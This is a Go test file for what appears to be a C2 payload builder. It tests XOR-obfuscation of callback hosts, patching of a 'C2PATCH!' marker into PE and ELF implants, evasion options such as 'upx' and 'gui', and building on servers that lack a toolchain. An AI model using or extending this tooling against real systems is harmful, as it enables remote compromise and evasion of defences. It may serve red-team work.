package payload

import (
	"bytes"
	"context"
	"errors"
	"strings"
	"testing"
	"time"
)

func TestXorDefaultHostPort(t *testing.T) {
	host := xorEncode("10.211.55.2", xorKey)
	port := xorEncode("34567", xorKey)
	if cArray(host) != "0x6b, 0x6a, 0x74, 0x68, 0x6b, 0x6b, 0x74, 0x6f, 0x6f, 0x74, 0x68, 0x00" {
		t.Fatalf("host %s", cArray(host))
	}
	if cArray(port) != "0x69, 0x6e, 0x6f, 0x6c, 0x6d, 0x00" {
		t.Fatalf("port %s", cArray(port))
	}
}

func TestValidate(t *testing.T) {
	ok, err := Validate(Request{Host: "10.0.0.8", Port: 34567, Filename: "client"})
	if err != nil {
		t.Fatal(err)
	}
	if ok.Filename != "client.exe" || ok.Host != "10.0.0.8" {
		t.Fatalf("%+v", ok)
	}
	if _, err := Validate(Request{Host: "c2.example.com", Port: 34567, Filename: "a.exe"}); err != nil {
		t.Fatal(err)
	}
	cases := []Request{
		{Host: "0.0.0.0", Port: 1},
		{Host: "224.0.0.1", Port: 1},
		{Host: "10.0.0.1", Port: 0},
		{Host: "10.0.0.1", Port: 1, Filename: "../x.exe"},
	}
	for _, c := range cases {
		if _, err := Validate(c); !errors.Is(err, ErrInvalid) {
			t.Fatalf("want invalid for %+v, got %v", c, err)
		}
	}
}

func TestPatchBinary(t *testing.T) {
	res, err := Build(context.Background(), Request{Host: "192.168.1.20", Port: 4444, Filename: "t.exe", Target: "windows-x64", Language: "c", Techniques: []string{"xor", "gui"}})
	if err != nil {
		t.Fatal(err)
	}
	if res.Bytes[0] != 'M' || res.Bytes[1] != 'Z' {
		t.Fatalf("not pe")
	}
	if bytes.Index(res.Bytes, []byte("C2PATCH!")) < 0 {
		t.Fatal("magic missing")
	}
	plain, err := Build(context.Background(), Request{Host: "10.0.0.9", Port: 2222, Filename: "p.exe", Target: "windows-x64", Language: "c", Techniques: []string{"gui"}})
	if err != nil {
		t.Fatal(err)
	}
	if bytes.Index(plain.Bytes, []byte("10.0.0.9")) < 0 {
		t.Fatal("xor off should write plaintext host")
	}
}

func TestValidateLanguage(t *testing.T) {
	if _, err := Validate(Request{Host: "10.0.0.8", Port: 34567, Target: "linux-amd64", Language: "c"}); !errors.Is(err, ErrInvalid) {
		t.Fatalf("c on linux: %v", err)
	}
	ok, err := Validate(Request{Host: "10.0.0.8", Port: 34567, Filename: "t.exe", Target: "windows-x64", Language: "c", Techniques: []string{"upx"}})
	if err != nil {
		t.Fatal(err)
	}
	if ok.Language != "c" || !ok.Has("upx") || ok.Has("xor") {
		t.Fatalf("%+v", ok)
	}
}

func TestBuildPE(t *testing.T) {
	if _, err := Compiler(); err != nil {
		t.Skip("mingw not installed")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 45*time.Second)
	defer cancel()
	res, err := Build(ctx, Request{Host: "127.0.0.1", Port: 34567, Filename: "t.exe"})
	if err != nil {
		t.Fatal(err)
	}
	if res.Filename != "t.exe" || len(res.Bytes) < 1024 || res.Bytes[0] != 'M' || res.Bytes[1] != 'Z' {
		t.Fatalf("bad pe name=%s len=%d", res.Filename, len(res.Bytes))
	}
}

func TestStoreUniqueID(t *testing.T) {
	st := NewStore(t.TempDir())
	a, err := st.Put(Record{Filename: "a.exe", Host: "127.0.0.1", Port: 1, Target: "windows-x64"}, []byte("a"))
	if err != nil {
		t.Fatal(err)
	}
	b, err := st.Put(Record{Filename: "b.exe", Host: "127.0.0.1", Port: 1, Target: "windows-x64"}, []byte("bb"))
	if err != nil {
		t.Fatal(err)
	}
	if a.ID == b.ID {
		t.Fatalf("same-second payloads share id %q", a.ID)
	}
	if _, got, err := st.File(b.ID); err != nil || string(got) != "bb" {
		t.Fatalf("file %q: %v %q", b.ID, err, got)
	}
}

// TestGoPayloadFallsBackToTemplate covers the deployed-server case: no Go
// toolchain, no module source, but the binary carries embedded stubs. The
// payload must still be produced instead of returning ErrNoCompiler.
func TestGoPayloadFallsBackToTemplate(t *testing.T) {
	t.Setenv("PATH", "") // hide go, upx, garble
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	res, err := Build(ctx, Request{Host: "10.0.0.9", Port: 4444, Filename: "probe", Target: "linux-amd64", Language: "go"})
	if err != nil {
		t.Fatalf("build: %v", err)
	}
	if len(res.Bytes) < 1<<20 || res.Bytes[0] != 0x7f || res.Bytes[1] != 'E' || res.Bytes[2] != 'L' || res.Bytes[3] != 'F' {
		t.Fatalf("not an ELF payload: len=%d magic=% x", len(res.Bytes), res.Bytes[:4])
	}
	joined := strings.Join(res.Techniques, " ")
	if !strings.Contains(joined, "内嵌模板") {
		t.Fatalf("techniques should mention the stub: %v", res.Techniques)
	}
	// The callback host/port must be the requested ones. Validate turns on the
	// "xor" technique by default, so the patch site holds ciphertext: decode it
	// with the key byte stored next to the magic instead of searching plaintext.
	i := bytes.Index(res.Bytes, []byte("C2PATCH!"))
	if i < 0 {
		t.Fatal("patch site missing from the stubbed payload")
	}
	key := res.Bytes[i+8]
	field := res.Bytes[i+9 : i+72]
	end := bytes.IndexByte(field, 0)
	if end < 0 {
		end = len(field)
	}
	host := make([]byte, end)
	for n := 0; n < end; n++ {
		host[n] = field[n] ^ key
	}
	if string(host) != "10.0.0.9" {
		t.Fatalf("callback host = %q, want 10.0.0.9", host)
	}
}

// TestStatusWithoutToolchain keeps the console honest: with no compilers the
// languages still advertise ready because the stubs can serve every target.
func TestStatusWithoutToolchain(t *testing.T) {
	t.Setenv("PATH", "")
	m := Status()
	byID := map[string]LangInfo{}
	for _, l := range m.Languages {
		byID[l.ID] = l
	}
	if !byID["go"].Ready {
		t.Fatalf("go language should be ready via embedded stubs: %+v", byID["go"])
	}
	if !strings.Contains(byID["go"].Hint, "内嵌") {
		t.Fatalf("hint should explain the fallback: %q", byID["go"].Hint)
	}
	for _, tgt := range m.Targets {
		if !tgt.Ready {
			t.Fatalf("target %s not ready: %+v", tgt.ID, tgt)
		}
		if !strings.Contains(tgt.Compiler, "内置模板") {
			t.Fatalf("target %s should advertise the stub when no toolchain: %+v", tgt.ID, tgt)
		}
	}
}

// TestStatusCompilerLabelsMatchBuildPath keeps the console honest after a
// toolchain is installed: the go targets must stop claiming "内置模板".
func TestStatusCompilerLabelsMatchBuildPath(t *testing.T) {
	if _, err := goBin(); err != nil {
		t.Skip("no toolchain in this environment")
	}
	m := Status()
	for _, tgt := range m.Targets {
		if tgt.ID == "windows-x64" {
			continue // the C path depends on mingw, not on go
		}
		if !strings.Contains(tgt.Compiler, "现场编译") {
			t.Fatalf("target %s should advertise compiling: %q", tgt.ID, tgt.Compiler)
		}
	}
}
